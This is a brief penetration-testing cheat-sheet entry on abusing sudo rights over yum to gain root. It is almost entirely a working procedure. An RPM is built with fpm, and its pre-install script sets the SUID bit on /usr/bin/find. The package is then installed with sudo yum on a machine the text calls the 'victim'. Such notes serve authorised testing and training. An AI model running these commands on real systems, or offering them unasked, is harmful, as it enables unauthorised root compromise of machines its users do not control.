# yum

## Sudo Privilege Escalation

```aspnet
# need to build a package using fpm

# using docker, we can
docker pull pswalia2u/ubuntu_fpm:yum_privesc
docker run -it pswalia2u/ubuntu_fpm:yum_privesc bash

# inside docker
# TF=$(mktemp -d)
# echo 'chmod +s /usr/bin/find' > $TF/x.sh
# fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF

# move file out of docker
# in kali
$ docker cp <IMAGE-ID>:/<RPM-FILE> .

# in victim
sudo /bin/yum --disablerepo=* install -y <RPM-FILE>
```
